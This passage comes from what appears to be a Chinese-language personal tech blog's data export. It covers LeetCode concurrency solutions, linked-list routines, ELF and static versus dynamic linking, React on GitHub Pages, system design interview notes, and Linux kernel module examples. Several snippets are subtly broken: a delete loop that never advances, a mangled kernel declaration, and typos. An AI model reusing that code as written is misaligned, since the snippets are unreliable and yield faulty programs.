0) Thread.yield();            h--;            releaseHydrogen.run();                    o++;        &#125;    &#125;    public void oxygen(Runnable releaseOxygen) throws InterruptedException &#123;        synchronized(b) &#123;            while (o &lt; 2) Thread.yield();            o-=2;            releaseOxygen.run();            h+=2;        &#125;    &#125;&#125;\nlockfree (TLE)\nlockfree就是不符合執行條件就丟出去，這樣有可能浪費很多次做事的機會\nlock不是不好，怕的是有人長期持有，又有一堆人去搶\nclass H2O &#123;    private volatile int h = 0;    public void hydrogen(Runnable releaseHydrogen) throws InterruptedException &#123;        while (h &lt;= 0) Thread.yield();        releaseHydrogen.run();        if (h &gt; 0) &#123; h--; &#125;    &#125;    public void oxygen(Runnable releaseOxygen) throws InterruptedException &#123;        while (h &gt; 0) Thread.yield();        releaseOxygen.run();        if (h &lt;= 0) &#123; h+=2; &#125;    &#125;&#125;\n1226. The Dining Philosophers\n其實重點就是相鄰的哲學家要先去搶同一個叉子\nclass DiningPhilosophers &#123;    private Integer[] lks;    public DiningPhilosophers() &#123;        lks = new Integer[] &#123;0, 1, 2, 3, 4&#125;;    &#125;    // call the run() method of any runnable to execute its code    public void wantsToEat(int philosopher,                           Runnable pickLeftFork,                           Runnable pickRightFork,                           Runnable eat,                           Runnable putLeftFork,                           Runnable putRightFork) throws InterruptedException &#123;        int left = philosopher;        int right = (philosopher+5-1) % 5;        if (philosopher % 2 == 1) &#123;            left = left ^ right; right = left ^ right; left = left ^ right;        &#125;        synchronized(lks[left]) &#123;            synchronized(lks[right]) &#123;                pickLeftFork.run();                pickRightFork.run();                eat.run();                putRightFork.run();                putLeftFork.run();            &#125;        &#125;    &#125;&#125;","categories":["Algorithm","Leetcode","Concurrency"]},{"title":"leetcode的問題集","url":"/2021/07/leetcode-problem-lists/","content":"動機\nleetcode如今已經累積接近2000題，要刷就從別人整理好的list開始\n\n刷完的List\n建議是從第一個刷到最後一個\n\n60 questions to solve\nBlind Curated 75\nTop 100 Liked Questions\nTop Interview Questions\nCracking The Coding Interview 6th Edition In LeetCode\n\n有list\n\n\nAlgorithm, Leetcode PATTERNS(seanprashad)\n\n其他大大分享的List\n\nAlgorithm, Leetcode Index for YT\nPTT Soft_Job 我的leetcode刷題清單\n\nAlgorithm, Leetcode_MostLikedQuests\n\n\n\n","categories":["Algorithm","Leetcode"]},{"title":"linked-list的faq","url":"/2021/07/linked-list-faq/","content":"動機\n就faq，所以把記得的列一下\n\ninsert\ndef insert_node(head,n,newnode):  prev = None  while head and n != 0:    prev = head    head = head.next    n -= 1  if n == 0:    if prev:      prev.next = newnode      newnode.next = head    else:      newnode.next = head  else:    raise RuntimeError()  \ndelete\ndef del_node(head,n):  cur = head  ret = None  prev = None  while cur:    if cur.val == n:      if prev:        prev.next = cur.next      elif not ret:        ret = cur.next  if not ret:    ret = head  return ret\nreverse\n這邊給的revserse是[a,b)\nrecursive\n先到最後一個，之後回去時再一層一層接回去\ndef rev(a,b): # [a,b)  if a.next is b:      return [a, a]  else:      h,d = rev(a.next,b)      d.next = a      return [h,a] # head, tail\niterative\n1 -&gt; 2 -&gt; 3，2 -&gt; 1 , 3，3- &gt; 2 -&gt; 1\n每次交換完，都是被換(1換2)的變成下一次loop要被換下去的(2換3)\n所以可以給出兩個ptr，一個是要被換的，另一個是與之交換的\ndef rev(a,b): # [a,b)  ptr = a  ptr_next = a.next  a.next = None #第一次換要把連結打斷，不然會loop  while ptr_next is not b:      tmp = ptr_next.next      ptr_next.next = ptr # 2 指向 1      ptr = ptr_next # 下一次處理2      ptr_next = tmp  return [ptr,a] # head, tail\n找中點\nj走的距離是i的兩倍!!\n所以當j到底時i剛好在一半\ndef mid(root):  i = root  j = root  while j and j.next:    i = i.next    j = j.next.next  return i\n關於sort\n要用merge sort，不能用quick sort，qsort的worst case可以到n^2，但merge都是nlogn\n","categories":["Algorithm","Classic"]},{"title":"linking的種類","url":"/2021/07/linking-and-elf/","content":"動機\n看bpf時突然想起來，整理一下\n\n行前工具\n\ncompiler: gcc\n看elf的工具: readelf 或 objdump\n單純看symbol: nm\n\ncompile流程\n\ncompile: code -&gt; object code\n\n前面其實還有preprocesser展開，但先當成一起的\n從高階語言變成低階語言\n\n\nassemble: object code -&gt; binary(relocatable, 又名object file)\n\n從低階語言變成binary\n但在其他檔案的code怎麼找到他們?\n\n\nlinking: binary(relocatable, 又名object file) -&gt; binary(real exe)\n\n把其他object file整理起來\n算位置並填上binary去 (relocate)\n\n\n\nELF\nkernel就是從ELF去看或找\n\n有什麼code\n有什麼symbol、要去哪找\n大小、長度多少\n資料的讀取權限\ndebug info\n\n類型有\n\nrelocatable(o)\nexecutable\nshared obj(so)\ncore(core dump)\n\n\n詳細的可以看這邊\n所以生出exe的過程可以看成改寫ELF的過程\nlinking\n\nlinking\n\n把很多object file和在一起\n確認symbol在不在，處理各個symbol\n依據symbol的來源分成兩種\n\nstatic linking\n\nsymbol實際定義都在object file中\n\n只要排好給位置就好(relocate)\n\n\n所以\n\nstatic lib其實就是把object file黏成一個\n如果改code要重算\nstatic加越多，最後出來的exe越大\n\n\n\n\ndynamic linking\n\nsymbol不在object file中，所以\n\n執行時要往外找 (先找到先用)\n\n等到要load lib時，linker一樣會做relocate，不過與static不同，看PIC\n\n\n編譯時\n\n有找到就編過\nsymbol會標上dynamic\n\n\n\n\n所以\n\n編dynamic lib需要特別一點\n\n因為每個proc就算call同一種code，內部addr也會不同\n\nPosition-independent Code(PIC)，兩個case\n\ncode都在同一個檔案\n\n直接算相對位置\n\n\n需要其他lib\n\nlinker在載入lib時會填Global Offset Table\n裡面會有其他lib的位置，等要call就去查，再跳\n\n\n\n\n\n\n\n\n可以開心地換lib\n大家可以共用\n可以在runtime做load!! (dlopen, dlsym, dlerror, dlclose)\n\n\n\n\n\n\n\n\n\n實際試試看\ncompile+assemble\nmain.c，但沒有p1, p2的宣告\nvoid main() &#123;  p1();&#125;\ngcc -c main.c\nmain.c: In function ‘main’:main.c:4:5: warning: implicit declaration of function ‘p1’ [-Wimplicit-function-declaration]    4 |     p1();      |     ^~\n把p1補上去\nvoid p1();void main() &#123;  p1();&#125;\nstatic linking\na.c\n#include &lt;stdio.h&gt;void p1()&#123;  puts(&quot;static&quot;);&#125;\n同樣編成object file\ngcc -o a.c\n開編\ngcc -o main main.o a.o\n如果想模擬一下static lib\nar rcs liba.a a.o\n編的語法是\ngcc -o main -L. -la\n其中-L是lib要去哪裡找，-l是lib的名稱\n在linux，lib都是lib&lt;libname&gt;.??\nnm\n先用nm看有什麼symbol，有puts與p1\nbee314@DESKTOP-259SCE7:~$ nm main0000000000003dc8 d _DYNAMIC0000000000003fb8 d _GLOBAL_OFFSET_TABLE_0000000000002000 R _IO_stdin_used                 w _ITM_deregisterTMCloneTable                 w _ITM_registerTMCloneTable0000000000002184 r __FRAME_END__0000000000002010 r __GNU_EH_FRAME_HDR0000000000004010 D __TMC_END__0000000000004010 B __bss_start                 w __cxa_finalize@@GLIBC_2.2.50000000000004000 D __data_start0000000000001100 t __do_global_dtors_aux0000000000003dc0 d __do_global_dtors_aux_fini_array_entry0000000000004008 D __dso_handle0000000000003db8 d __frame_dummy_init_array_entry                 w __gmon_start__0000000000003dc0 d __init_array_end0000000000003db8 d __init_array_start00000000000011f0 T __libc_csu_fini0000000000001180 T __libc_csu_init                 U __libc_start_main@@GLIBC_2.2.50000000000004010 D _edata0000000000004018 B _end00000000000011f8 T _fini0000000000001000 t _init0000000000001060 T _start0000000000004010 b completed.80600000000000004000 W data_start0000000000001090 t deregister_tm_clones0000000000001140 t frame_dummy0000000000001149 T main000000000000115e T p1                 U puts@@GLIBC_2.2.500000000000010c0 t register_tm_clones\nreadelf &amp; objdump\n編出來後用objdump與readelf看dynsym，會看到這裡的dynsym是puts\nbee314@DESKTOP-259SCE7:~$ readelf -r mainRelocation section &#x27;.rela.dyn&#x27; at offset 0x520 contains 8 entries:  Offset          Info           Type           Sym. Value    Sym. Name + Addend000000003db8  000000000008 R_X86_64_RELATIVE                    1140000000003dc0  000000000008 R_X86_64_RELATIVE                    1100000000004008  000000000008 R_X86_64_RELATIVE                    4008000000003fd8  000100000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTMClone + 0000000003fe0  000300000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0000000003fe8  000400000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0000000003ff0  000500000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCloneTa + 0000000003ff8  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize@GLIBC_2.2.5 + 0Relocation section &#x27;.rela.plt&#x27; at offset 0x5e0 contains 1 entry:  Offset          Info           Type           Sym. Value    Sym. Name + Addend000000003fd0  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0\nbee314@DESKTOP-259SCE7:~$ objdump -T mainmain:     file format elf64-x86-64DYNAMIC SYMBOL TABLE:0000000000000000  w   D  -UND*  0000000000000000              _ITM_deregisterTMCloneTable0000000000000000      DF -UND*  0000000000000000  GLIBC_2.2.5 puts0000000000000000      DF -UND*  0000000000000000  GLIBC_2.2.5 __libc_start_main0000000000000000  w   D  -UND*  0000000000000000              __gmon_start__0000000000000000  w   D  -UND*  0000000000000000              _ITM_registerTMCloneTable0000000000000000  w   DF -UND*  0000000000000000  GLIBC_2.2.5 __cxa_finalize\nldd\n最後用ldd看有連結到那些lib，就是最基本的\nbee314@DESKTOP-259SCE7:~$ ldd main        linux-vdso.so.1 (0x00007fffde0c8000)        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0db9050000)        /lib64/ld-linux-x86-64.so.2 (0x00007f0db926d000)\ndynamic linking\nb.c\nvoid p1() &#123;  puts(&quot;dynamic&quot;);&#125;\n編成shared lib\ngcc -o libb.so -fPIC -shared b.c\n開編\ngcc -o main -L. -lb\n之後執行下去\n./main: error while loading shared libraries: libb.so: cannot open shared object file: No such file or directory\n這是找不到shared lib，所以\n\n把libb.so放到預設路徑\n加找的路徑\n\n這裡直接幫他加找的路徑\nLD_LIBRARY_PATH=. ./main\nnm\n用nm看有什麼symbol，少了puts\nbee314@DESKTOP-259SCE7:~$ nm main0000000000003db8 d _DYNAMIC0000000000003fb8 d _GLOBAL_OFFSET_TABLE_0000000000002000 R _IO_stdin_used                 w _ITM_deregisterTMCloneTable                 w _ITM_registerTMCloneTable000000000000214c r __FRAME_END__0000000000002004 r __GNU_EH_FRAME_HDR0000000000004010 D __TMC_END__0000000000004010 B __bss_start                 w __cxa_finalize@@GLIBC_2.2.50000000000004000 D __data_start0000000000001100 t __do_global_dtors_aux0000000000003db0 d __do_global_dtors_aux_fini_array_entry0000000000004008 D __dso_handle0000000000003da8 d __frame_dummy_init_array_entry                 w __gmon_start__0000000000003db0 d __init_array_end0000000000003da8 d __init_array_start00000000000011d0 T __libc_csu_fini0000000000001160 T __libc_csu_init                 U __libc_start_main@@GLIBC_2.2.50000000000004010 D _edata0000000000004018 B _end00000000000011d8 T _fini0000000000001000 t _init0000000000001060 T _start0000000000004010 b completed.80600000000000004000 W data_start0000000000001090 t deregister_tm_clones0000000000001140 t frame_dummy0000000000001149 T main                 U p100000000000010c0 t register_tm_clones\nreadelf &amp; objdump\n同樣用objdump與readelf看dynsym，這邊只剩下p1，而沒有puts了\nbee314@DESKTOP-259SCE7:~$ readelf -r mainRelocation section &#x27;.rela.dyn&#x27; at offset 0x528 contains 8 entries:  Offset          Info           Type           Sym. Value    Sym. Name + Addend000000003da8  000000000008 R_X86_64_RELATIVE                    1140000000003db0  000000000008 R_X86_64_RELATIVE                    1100000000004008  000000000008 R_X86_64_RELATIVE                    4008000000003fd8  000100000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTMClone + 0000000003fe0  000200000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0000000003fe8  000300000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0000000003ff0  000500000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCloneTa + 0000000003ff8  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize@GLIBC_2.2.5 + 0Relocation section &#x27;.rela.plt&#x27; at offset 0x5e8 contains 1 entry:  Offset          Info           Type           Sym. Value    Sym. Name + Addend000000003fd0  000400000007 R_X86_64_JUMP_SLO 0000000000000000 p1 + 0\nbee314@DESKTOP-259SCE7:~$ objdump -T mainmain:     file format elf64-x86-64DYNAMIC SYMBOL TABLE:0000000000000000  w   D  -UND*  0000000000000000              _ITM_deregisterTMCloneTable0000000000000000      DF -UND*  0000000000000000  GLIBC_2.2.5 __libc_start_main0000000000000000  w   D  -UND*  0000000000000000              __gmon_start__0000000000000000      DF -UND*  0000000000000000              p10000000000000000  w   D  -UND*  0000000000000000              _ITM_registerTMCloneTable0000000000000000  w   DF -UND*  0000000000000000  GLIBC_2.2.5 __cxa_finalize\nldd\n用ldd看連結到那些lib，多了libb.so，雖然找不到\nbee314@DESKTOP-259SCE7:~$ ldd main        linux-vdso.so.1 (0x00007fffc4a8a000)        libb.so =&gt; not found        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5a07ce0000)        /lib64/ld-linux-x86-64.so.2 (0x00007f5a07efa000)\n讓ldd好看一點，把libb.so移到/lib/x86_64-linux-gnu/(抄libc.so.6)\nbee314@DESKTOP-259SCE7:~$ ldd main        linux-vdso.so.1 (0x00007fffeb59a000)        libb.so =&gt; /lib/x86_64-linux-gnu/libb.so (0x00007fe732bc0000)        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe7329c0000)        /lib64/ld-linux-x86-64.so.2 (0x00007fe732be1000)\nRef\nDynamic Linking Position-independent Code（PIC）\n","categories":["System","Linux","FAQ"]},{"title":"在github page上用reactjs","url":"/2021/07/react-github-page/","content":"動機\n最初是為了使用同一個data source去生不同版本resume，所以研究怎麼用reactjs與github page，這裡說說遇到的坑\n\n困難點\n\n設計遞迴結構\n\n\n同樣的結構，但是因為位置不同需要的render也不一樣，所以要想辦法讓轉換器知道該換成什麼\n這裡的方法是，在json的key放不同的string，以區分不同的case\n之後還要讓其他遞迴照常運行\n不過這樣讓整個JSON不好被操作\n\n\n自動deploy到blog\n把build出來的檔案copy到另一個branch去\n- 原本想用copy之類的action自己用，都一直出事\n- 最後是改用deploy github page的action就直接ok\nsubmodule怎麼更新\n- git submodule update --init --recursive是拉檔案\n- git submodule add -b BRANCH URL的添加方法不會自動更新submodule\n- git submodule update --remote --recursive才會更新!!\n在react build完時deploy到blog，讓他rebuild\n- 我是用submodule讓react與blog共用同一個domain\n- 但需要在react build完時讓blog rebuild去拉新submodule\n- 所以要讓blog有辦法被call去rebuild，方法在另一篇\n讓同一個網頁依據不同網址顯示不同版本的網頁\n\n\n用react router，但是如果直接上github page，打不同網址就會報404，所以要用HashRouter\n\n\nreact會亂call\n\n\nreactjs處理component不是轉成html就沒了，會在不知情時被call\n\n所以在json上遞迴的時候偶而input會是undefined，這個要處理\n\n\n如果在array加東西是直接push，可能會看到被多push一次\n\n所以還要去判斷被push的東西在不在array中\n\n\n\n錯誤\n\n修改data source十分沒效率\n\n\n雖然是用json存資料，但是json有很多key是為了轉換器而生，所以要做刪除或是新增就會很麻煩\n每做一次就要重新找要操作的位置，就要重新遞迴找index\n\n\nreactjs的cache\n\n\n刪除或是新增json，在build出來的production沒辦法直接反應，\n但這應該與reactjs的cache有關，還要去看\n\n代辦事項\n\n設計更好懂的結構\n\n\n讓json跟好懂，把為了轉換器而生的key去掉，這樣操作data source的效率會好很多\n\n\n熟悉reactjs，處理前面奇怪的bug\n\n\n最初用reactjs就是當成html compiler而已\n但reactjs有自己處理component的方法，要去研讀這一段\n\n","categories":["Javascript","Small project","Tips"]},{"title":"system-design的faq","url":"/2021/07/system-design-faq/","content":"動機\n之前面試莫名其妙被system design電到翻過去，\n之後看了，system design primer，但還是出事，以為只要把system design的觀念記熟就好，之後要我計算有的沒的就起飛。\n目前發現這個，看完發現，原來我之前只有準備一半啊\nsystem design的面試其實有一定的程序要走，不是單純的QA\n這個沒做過相關的分析，基本上應該很難當場想出來，我當初是能想到設計，但沒辦法證明(do some math)這是可行的\n所以這篇，是要補完這點。\n\n過程\n\n需求\n\n\n功能\noutput\n\n格式\n\n\nInput的量\n\n每秒多少資料\n每秒多少request\n\n\nthroughput\n\nQueries Per Second, QPS\n預期希望處理多少資料\n\n\nlatency\n\n\n限制\n\n\n有什麼機器，spec\n\ncore\nRAM\n\n\nCAP\n\nCA\n\n一致性(總是能拿到最新的) + 可用性(拿得到資料)\n單一DB\n\n\nAP &amp; CP\n\n分區容錯性(能不能分區，只有一部份是好的)\n有P就是兩個case\n\n-總是拿到*資料，但是可能是舊的: AP\n可能拿不到資料，但是一定是新的: CP\n\n\n\n\n最終一致性\n\n\n\n\n算需要多少資源\n\n\nDaily Active User &amp; QPS &amp; storage &amp; 幾台機器\n\ncreation QPS\nreading QPS\nstorage for a day &amp; many years(10years)\n\n\n需求+spec不能超過物理限制\n\nspec\n\nram\nssd/hdd\nnetwork(RTT)\ncores\n\n\n需求\n\nthroughput(qps)\ninput\nlatency\n\n\n\n\n常見物理限制的平均值\n\nram\n\n250us\n\n\nssd\n\n1000us\n\n\ncompress\n\n3us\n\n\nnetwork\n\nsame data center\n\n500us\n\n\nCA&lt;-&gt;Netherlands\n\n150000us\n\n\n\n\n1us = 10^-6secs\n1ns = 10^-9secs\n1ms = 10^-3secs\n\n\n\n\n畫架構(API -&gt; prog) &lt;-&gt; 加強 (loop)\n\n\nCDN, DNS\nmessage queue\nconcurreny/parallel design\nLoad Balancer\n\n分配方式: random, 最少負載\nlayer 4 or layer 7\n\n\ncache\n\nwrite around\nwrite through\nwrite back\n\n\nmulti-server\n\n多master or master-slave\n\n容錯轉移(failover) or 複寫(Replication)\n\n\nauto scale\n\ncontainer orchestration platform\n\n\n讀寫分離\n\ntotal = R+W，分配R與W的數量\n\n\n\n\nDB\n\nschema\n\n反正規化\ndesign\n\none to one\none to many\nmany to many\n\n\n\n\nmulti-server\n\n依功能分成多DB (federative database)\n把資料分散到多DB (sharding)\n\n\nSQL/noSQL\n\nSQL: 強一致性, transaction, 複雜結構(join,index)\nSQL: 最終一致性, 高throughput, 巨量資料\n\n\n\n\n\n需要多少機器\n要想辦法讓需求在物理限制之中\n用這裡的快取做例子，來算一下\n這裡是設計快取，所以記憶體的速度是物理限制\n之後，需求給qps與input總量，求大概幾台幾core多少ram的機器\n# 從會算的開始，要幾台host = total_input/ram# 每個core每秒要處理多少reqreq_per_core_per_sec = qps/(host*core)# 頻率就是時間的倒數latency = 1/req_per_core_per_sec = (host*core)/qps# 展開hostlatency = (total_input*core)/(ram*qps)# 把給定的數字分出來latency = (total_input/qps) * (core/ram)# 因為是物理限制，所以求出來的數字，不能超過latencylatency &lt;= (total_input/qps) * (core/ram)# 因此，要不是core變多，就是ram變小# 台數可以透過 host = total_input/ram 算\n上面推導完來帶數字\n\nqps: 10m\ntotal_input: 30tb\n\n這裡有個小訣竅，在算時把單位換成統一的比較好用，看要消的單位來看要換成或不會換\n像，與大小有關都是gb，時間都是sec\n查表會發現，從mem讀1MB要250us(10^-6 secs)\n先換算，250*10^-6\n250*10^-6 &lt;= (30*1000)/10*10^6 * (core/ram)# 化簡1 &lt;= 12 * (core/ram)# 4coresram &lt;= 12*core = 48\n所以4cores，一台最多只能48gb\n8cores，一台最多只能96gb\n照原本這裡第一次給的spec，4cores與72gb會爆，但是4cores與32gb不會爆\n那總共要幾台，以4cores與32gb來看，要30*1000gb/32gb=940台\n要在設計之前要知道\n\nDaily Active User\n\nread的頻率 =&gt; read的total_input\nwrite的頻率 =&gt; write的total_input\n\n\nuser產生的資料大小 (post, short url)\n\n有可能是根據自己設計的去算(short url)\n\n\nlatency for read &amp; write\nConsistency or Availability\nread-heavy or write-heavy or half-half\n\n之後要求出，下面的東西才能繼續做設計\n\nread QPS\nwrite QPS\nstorage comsumption\n\n如果需要求需要多少台機器\nlatency &lt;= (total_input/qps) * (core/ram)\n配合\nhost = total_input/ram\n例子\n這裡\n這裡2\n一些技巧\n\nAPI設計\n\n放api_dev_key\n\n做bandwidth controll\n\n\n\n\nImplement\n\nonline / offline\n\nonline: 一來算一筆\noffline: 預先生成資料 (short url的碼)\n\n\nSharding 的 hash key\n\nforeign key\nprimary key+timestamp(create time)\nprimary key+counter (zookeeper)\n\n\n要多長 (short url)\n\n要放多久*每天產生多少 &lt;= (possible chars)^長度\n有長度就可以算storage\n\n\n\n\n\ninterviewBit\nSharding a Database\n\nCan we have a fixed number of shards?\nmap to shard function: H % S\n\nnumber of shards is S\na numeric hash H\nWhen adding a new machine,\n\nneed to relocate each and every key\nextremely expensive and highly undesirable\n\n\n\n\nConsistent Hashing\n\n把shard列序\n將data或user map 到 其中一個shard\n如果出事或是加新機器\n\n把資料往下一台移(因為已經有順序了)\n\n\n\n\n\nHighly Available Database\n\nMaster Slave\nMulti Master\npeer to peer\n\nConsistent Hashing\n\nRead and Write consistency\n\n設有P份copy\n要讀或寫，就對所有shard發req，拿到一定數量的ack才成功\n\nR是回傳read成功的次數，W是回傳write成功的次數\n\n\n要維持C(總是拿到最新的write)\n\nW + R &gt; P\n\nW = P: 強C(每台都要回)\n\nR = 1: for fast read\n\n\nW &lt; P: 最終一致\n\nW = 1: for fast write\n要處理data conflict\n\n先寫先贏\n留標記\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHighly Consistent Database\n\n為了C與處理單點錯誤\n\n資料要write到多台DB\n\n\n如果每一台都write很費時，只要寫到一定數量就好\n\n需要master追蹤寫到哪些機器\n\n\nmaster只有一台? 單點錯誤\n\n多一台做standby\n\n\n\n","categories":["System","System Design"]},{"title":"top half & bottom half & workqueue & device範例集","url":"/2021/07/th-bh-wq-dev-example-collections/","content":"動機\n上次看完Linux Kernel Development 3rd，想說來補一下\n大概有個感覺\n\nsyscall\n要直接改kernel，因為是寫死的與sortirq一樣\n看這裡\ntop half\n#include &lt;linux/module.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/interrupt.h&gt;#include &lt;linux/delay.h&gt;#include &lt;linux/workqueue.h&gt;#include &lt;linux/kthread.h&gt;#include &lt;linux/slab.h&gt;/* interrupt handler *//* IRQ of your network card to be shared */#define SHARED_IRQ 19static int irq = SHARED_IRQ;module_param(irq, int, S_IRUGO);/* default delay time in top half -- try 10 to get results */static int delay = 0;module_param(delay, int, S_IRUGO);static atomic_t counter_bh, counter_th;struct my_dat &#123;    unsigned long jiffies; /* used for timestamp */    struct tasklet_struct tsk; /* used in dynamic tasklet solution */    struct work_struct work; /* used in dynamic workqueue solution */&#125; my_data;static struct my_dat static irqreturn_t my_interrupt (int irq, void *dev_id) &#123;    top_half_fun();    tasklet_schedule(&amp;t_name);    return IRQ_HANDLED;&#125;static int __init my_generic_init(void)&#123;    atomic_set(&amp;counter_bh, 0);    atomic_set(&amp;counter_th, 0);    /* use my_data for dev_id */    if (request_irq(irq, my_interrupt, IRQF_SHARED, &quot;my_int&quot;, &amp;my_data))        return -1;    printk(KERN_INFO &quot;successfully loaded\\n&quot;);    return 0;&#125;static void __exit my_generic_exit(void)&#123;    synchronize_irq(irq);    free_irq(irq, &amp;my_data);    printk(KERN_INFO &quot; counter_th = %d, counter_bh = %d\\n&quot;,    atomic_read(&amp;counter_th), atomic_read(&amp;counter_bh));    printk(KERN_INFO &quot;successfully unloaded\\n&quot;);&#125;/* https://www.cs.otago.ac.nz/cosc440/labs/lab08.pdf */\nbottom half (tasklet)\n#include &lt;linux/module.h&gt;#include &lt;linux/sched.h&gt;#include &lt;linux/interrupt.h&gt;#include &lt;linux/slab.h&gt;#include &lt;linux/init.h&gt;typedef struct simp_t &#123;    int i;    int j;&#125; simp;static simp t_data;/* tasklet bottom half */static void t_fun(unsignned long t_arg) &#123;    simp *datum = &amp;t_data;    printk(KERN_INFO &quot;Entering t_fun, datum-&gt;i = %d, jiffies = %ld\\n&quot;, datum-&gt;i, jiffies);    printk(KERN_INFO &quot;Entering t_fun, datum-&gt;j = %d, jiffies = %ld\\n&quot;, datum-&gt;j, jiffies);&#125;DECLARE_TASKLET_OLD (t_name, t_fun);static int __init my_init(void) &#123;    printk(KERN_INFO &quot;\\nHello: my_init loaded at address 0x%p\\n&quot;, my_init);    t_data.i = 100;    t_data.j = 200;    printk(KERN_INFO &quot;scheduling my tasklet, jiffies = %ld\\n&quot;, jiffies);    tasklet_schedule(&amp;t_name);    return 0;&#125;static void __exit my_exit(void) &#123;    printk(KERN_INFO &quot;\\nHello: my_exit loaded at address 0x%p\\n&quot;, my_exit);&#125;module_init(my_init);module_exit(my_exit);/* https://www.cs.otago.ac.nz/cosc440/labs/lab08.pdf */\nbottom half (workqueue)\n#include &lt;linux/kernel.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/workqueue.h&gt;MODULE_LICENSE(&quot;GPL&quot;);static struct workqueue_struct *queue;static void work_func(struct work_struct *work)&#123;\tprintk(KERN_INFO &quot;worker\\n&quot;);&#125;DECLARE_WORK(work, work_func);int init_module(void)&#123;\tqueue = create_singlethread_workqueue(&quot;myworkqueue&quot;);\tqueue_work(queue, &amp;work);\treturn 0;&#125;void cleanup_module(void)&#123;\t/* why is this needed? Why flush_workqueue doesn&#x27;t work? (re-insmod panics)\t * http://stackoverflow.com/questions/37216038/whats-the-difference-between-flush-delayed-work-and-cancel-delayed-work-sync */\t/*flush_workqueue(queue);*/\tcancel_work_sync(&amp;work);\tdestroy_workqueue(queue);&#125;/* https://github.com/cirosantilli/linux-kernel-module-cheat/blob/ad077d3943f79c0f6481dab929970613c33c31a7/kernel_module/workqueue_cheat.c */\ndevice driver\nmajor number是裝置的編號，像用ls -l去看tty都是4\nminor number是看major number決定他有什麼意義\nblock\n類似array\n#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/slab.h&gt;#include &lt;linux/vmalloc.h&gt;#include &lt;linux/fs.h&gt;#include &lt;linux/genhd.h&gt;#include &lt;linux/blkdev.h&gt;#include &lt;linux/buffer_head.h&gt;#include &lt;linux/blk-mq.h&gt;#include &lt;linux/hdreg.h&gt;#ifndef SECTOR_SIZE#define SECTOR_SIZE 512#endifstatic int dev_major = 0;/* Just internal representation of the our block device * can hold any useful data */struct block_dev &#123;    sector_t capacity;    u8 *data;   /* Data buffer to emulate real storage device */    struct blk_mq_tag_set tag_set;    struct request_queue *queue;    struct gendisk *gdisk;&#125;;/* Device instance */static struct block_dev *block_device = NULL;static int blockdev_open(struct block_device *dev, fmode_t mode)&#123;    printk(&quot;&gt;&gt;&gt; blockdev_open\\n&quot;);    return 0;&#125;static void blockdev_release(struct gendisk *gdisk, fmode_t mode)&#123;    printk(&quot;&gt;&gt;&gt; blockdev_release\\n&quot;);&#125;int blockdev_ioctl(struct block_device *bdev, fmode_t mode, unsigned cmd, unsigned long arg)&#123;    printk(&quot;ioctl cmd 0x%08x\\n&quot;, cmd);    return -ENOTTY;&#125;/* Set block device file I/O */static struct block_device_operations blockdev_ops = &#123;    .owner = THIS_MODULE,    .open = blockdev_open,    .release = blockdev_release,    .ioctl = blockdev_ioctl&#125;;/* Serve requests */static int do_request(struct request *rq, unsigned int *nr_bytes)&#123;    int ret = 0;    struct bio_vec bvec;    struct req_iterator iter;    struct block_dev *dev = rq-&gt;q-&gt;queuedata;    loff_t pos = blk_rq_pos(rq) &lt;&lt; SECTOR_SHIFT;    loff_t dev_size = (loff_t)(dev-&gt;capacity &lt;&lt; SECTOR_SHIFT);    printk(KERN_WARNING &quot;sblkdev: request start from sector %lld  pos = %lld  dev_size = %lld\\n&quot;, blk_rq_pos(rq), pos, dev_size);    /* Iterate over all requests segments */    rq_for_each_segment(bvec, rq, iter)    &#123;        unsigned long b_len = bvec.bv_len;        /* Get pointer to the data */        void* b_buf = page_address(bvec.bv_page) + bvec.bv_offset;        /* Simple check that we are not out of the memory bounds */        if ((pos + b_len) &gt; dev_size) &#123;            b_len = (unsigned long)(dev_size - pos);        &#125;        if (rq_data_dir(rq) == WRITE) &#123;            /* Copy data to the buffer in to required position */            memcpy(dev-&gt;data + pos, b_buf, b_len);        &#125; else &#123;            /* Read data from the buffer&#x27;s position */            memcpy(b_buf, dev-&gt;data + pos, b_len);        &#125;        /* Increment counters */        pos += b_len;        *nr_bytes += b_len;    &#125;    return ret;&#125;/* queue callback function */static blk_status_t queue_rq(struct blk_mq_hw_ctx *hctx, const struct blk_mq_queue_data* bd)&#123;    unsigned int nr_bytes = 0;    blk_status_t status = BLK_STS_OK;    struct request *rq = bd-&gt;rq;    /* Start request serving procedure */    blk_mq_start_request(rq);    if (do_request(rq, &amp;nr_bytes) != 0) &#123;        status = BLK_STS_IOERR;    &#125;    /* Notify kernel about processed nr_bytes */    if (blk_update_request(rq, status, nr_bytes)) &#123;        /* Shouldn&#x27;t fail */        BUG();    &#125;    /* Stop request serving procedure */    __blk_mq_end_request(rq, status);    return status;&#125;static struct blk_mq_ops mq_ops = &#123;    .queue_rq = queue_rq,&#125;;static int __init myblock_driver_init(void)&#123;    /* Register new block device and get device major number */    dev_major = register_blkdev(dev_major, &quot;testblk&quot;);    block_device = kmalloc(sizeof (struct block_dev), GFP_KERNEL);    if (block_device == NULL) &#123;        printk(&quot;Failed to allocate struct block_dev\\n&quot;);        unregister_blkdev(dev_major, &quot;testblk&quot;);        return -ENOMEM;    &#125;    /* Set some random capacity of the device */    block_device-&gt;capacity = (112 * PAGE_SIZE) &gt;&gt; 9; /* nsectors * SECTOR_SIZE; */    /* Allocate corresponding data buffer */    